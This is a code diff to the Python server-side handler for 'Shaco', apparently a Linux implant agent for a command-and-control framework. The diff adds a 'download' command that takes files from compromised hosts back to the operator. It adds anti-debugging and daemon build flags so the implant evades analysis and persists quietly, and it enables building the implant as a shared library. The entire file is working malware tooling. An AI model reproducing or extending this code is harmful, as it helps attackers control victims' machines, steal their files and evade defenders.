@@ -8,6 +8,8 @@ from shutil import which, rmtree
 from os import makedirs, path
 from traceback import print_exc
 
+import random
+import string
 import subprocess
 
 COMMAND_OK = 13
@@ -24,6 +26,16 @@ COMMAND_PWD = 92
 COMMAND_EXIT = 94
 COMMAND_SLEEP = 95
 COMMAND_JITTER = 96
+COMMAND_DOWNLOAD = 97
+
+RESPONSE_UPLOAD_SUCCESS = 1
+RESPONSE_DOWNLOAD_SUCCESS = 1
+RESPONSE_UPLOAD_ERROR = 2
+RESPONSE_DOWNLOAD_ERROR = 2
+RESPONSE_DOWNLOAD_NO_VALUE = 3
+
+def random_str( value : int):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=value))
 
 class CommandExit(Command):
     CommandId = COMMAND_EXIT
@@ -100,6 +112,27 @@ class CommandShell(Command):
         Task = Packer()
         Task.add_int32( self.CommandId )
         Task.add_str( arguments['command'] )
+        return Task.get_buffer()
+
+class CommandDownload(Command):
+    CommandId = COMMAND_DOWNLOAD
+    Name = "download"
+    Description = "download file of agent"
+    Help = "download <remotefile>"
+    NeedAdmin = False
+    Params = [
+        CommandParam(
+            name="remotefile",
+            is_file_path=False,
+            is_optional=False
+        )
+    ]
+    Mitr = ['']
+
+    def job_generate( self, arguments: dict ) -> bytes:        
+        Task = Packer()
+        Task.add_int32( self.CommandId )
+        Task.add_str( arguments['remotefile'].strip() )
         return Task.get_buffer()
 
 class CommandUpload(Command):
@@ -180,7 +213,7 @@ class CommandCd(Command):
     def job_generate( self, arguments: dict ) -> bytes:        
         Task = Packer()
         Task.add_int32( self.CommandId )
-        Task.add_str( arguments[ 'command' ] )
+        Task.add_str( arguments[ 'command' ].strip() )
         return Task.get_buffer()
 
 class Shaco(AgentType):
@@ -200,11 +233,11 @@ class Shaco(AgentType):
         {
             "Name": "Linux Executable",
             "Extension": "elf"
+        },
+        {
+            'Name': 'Linux Shared Library',
+            'Extension': 'so'
         }
-        #        {
-        #    'Name': 'Linux Shared Library',
-        #    'Extension': 'so'
-        #},
         #{
         # "Name": "MacOS",
             #    "Extension": 'macho'
@@ -213,7 +246,9 @@ class Shaco(AgentType):
     
     BuildingConfig = {
         'Sleep': '5',
-        'MaxTimeout': '0'
+        'MaxTimeout': '0',
+        'AntiDebug': True,
+        'Daemon': True
     }
 
     Commands = [
@@ -221,6 +256,7 @@ class Shaco(AgentType):
         CommandCd(), 
         CommandPwd(),
         CommandUpload(),
+        CommandDownload(),
         CommandCheckin(),
         CommandExit(),
         CommandSleep(),
@@ -229,9 +265,12 @@ class Shaco(AgentType):
 
 
     def generate(self, config:dict) -> None:
-        tmppath = "/tmp/shaco_agent_generation"
+        print(config)
 
+        tmppath = "/tmp/shaco_agent_generation"
         cliid = config['ClientID']
+        flags = ''
+        file = 'shaco'
 
         try:
             self.builder_send_message(cliid, MessageType.Info, "initializing")
@@ -255,7 +294,7 @@ class Shaco(AgentType):
             with open('./Config/Settings.c', 'r') as cfg:
                 original_cfg_data = cfg.read()
 
-            supported_arch = [ 'x86', 'x64', 'ARM' ]
+            supported_arch = [ 'x86', 'x64', 'arm' ]
             config_vars = ['%IP%', '%ENDPOINT%', '%DOMAIN%', '%USERAGENT%', '%TIMEOUT%', '%PORT%', '%MAXTIMEOUT%']
             cfg_data = ''
 
@@ -275,12 +314,28 @@ class Shaco(AgentType):
                 self.builder_send_message(cliid, MessageType.Error, "Unsupported architecture")
                 return
 
+
             uris = config['Options']['Listener']['Uris']
             uri = '/' if uris is None else uris[0]
             if uri == '':
                 uri = '/'
 
+            if config['Config']['AntiDebug']:
+                flags += '-DAntiDebug=ON '
+
+            if config['Config']['Daemon']:
+                flags += '-DDaemon=ON '
+
+            if config['Options']['Format'] == 'Linux Shared Library':
+                self.builder_send_message(cliid, MessageType.Info, "Compiling Shared Library")
+                flags += '-DCOMPILE_LIB=ON '
+                file = 'libshaco.so'
+
             architecture = config['Options']['Arch']
+            flags += f'-DCOMPILE_ARCH={architecture} '
+
+            flags += '-DCMAKE_BUILD_TYPE=Release '
+
             port = config['Options']['Listener']['PortConn']
             if port == '':
                 port = config['Options']['Listener']['PortBind']
@@ -300,7 +355,7 @@ class Shaco(AgentType):
             cfg_data = cfg_data.replace('%PORT%', port)
 
             try:
-                with open('./Config/Settings.c' ,'w') as cfg:
+                with open('./Config/Settings.c', 'w') as cfg:
                     cfg.write(cfg_data)
     
                 if path.exists(tmppath):
@@ -311,7 +366,7 @@ class Shaco(AgentType):
                 makedirs(tmppath, exist_ok=True)
                 
                 print("Executing cmake compile command")
-                out = subprocess.check_output(f'cmake -S . -B {tmppath} -DCMAKE_BUILD_TYPE=Release -DCOMPILE_ARCH={architecture}', shell=True, stderr=subprocess.STDOUT)
+                out = subprocess.check_output(f'cmake -S . -B {tmppath} {flags}', shell=True, stderr=subprocess.STDOUT)
 
                 print("sending data to client")
                 self.builder_send_message(cliid, MessageType.Info, out.strip().decode())
@@ -320,10 +375,14 @@ class Shaco(AgentType):
 
                 self.builder_send_message(cliid, MessageType.Info, out.strip().decode())
 
-                with open(f'{tmppath}/shaco', 'rb') as f:
-                    self.builder_send_message(cliid, MessageType.Good, 'Sending compiled download!')
-                    self.builder_send_payload(cliid, f'shaco', f.read())
+                with open(f'{tmppath}/{file}', 'rb') as f:
+                    self.builder_send_message(cliid, MessageType.Good, 'Sending compiled shaco!')
+                    self.builder_send_payload(cliid, file, f.read())
 
+            except subprocess.CalledProcessError as ex:
+                self.builder_send_message(cliid, MessageType.Error, f'An error ocurred on Compiling:\n{ex.output.decode()}')
+                print(ex.output.decode())
+                print(ex.stderr)
             except Exception as ex:
                 self.builder_send_message(cliid, MessageType.Error, f'Error in compilation {str(ex)}')
                 print_exc()
@@ -408,11 +467,23 @@ Jitter:      \t{parser.get_int32()}
             try:
                 if cmdid == COMMAND_UPLOAD:
                     ok = Parser(parser.get_data()).get_int32()
-                    if ok == 1:
+                    if ok == RESPONSE_UPLOAD_SUCCESS:
                         self.console_message(agentid, MessageType.Good, 'Shaco Output: ', "uploaded file to the host")
                     else:
                         self.console_message(agentid, MessageType.Good, 'Shaco Output: ', "can't upload the file")
-                else:        
+                elif cmdid == COMMAND_DOWNLOAD:
+                    ok = Parser(parser.get_data())
+                    v_res = ok.get_int32()
+                    if v_res == RESPONSE_DOWNLOAD_SUCCESS:
+                        size = ok.get_uint64()
+                        file = ok.get_data64()
+                        self.console_message(agentid, MessageType.Good, 'Shaco Output: ', "Received file from shaco agent")
+                        self.download_file(agentid, random_str(10), size, file)
+                    elif v_res == RESPONSE_DOWNLOAD_NO_VALUE:
+                        self.console_message(agentid, MessageType.Info, 'Shaco Output: ', "The file has no output")
+                    else:
+                        self.console_message(agentid, MessageType.Error, 'Shaco Output: ', "can't download the file")
+                else:
                     raw = parser.get_data()
                     rawdec = Parser(raw)
                     out = rawdec.get_data()
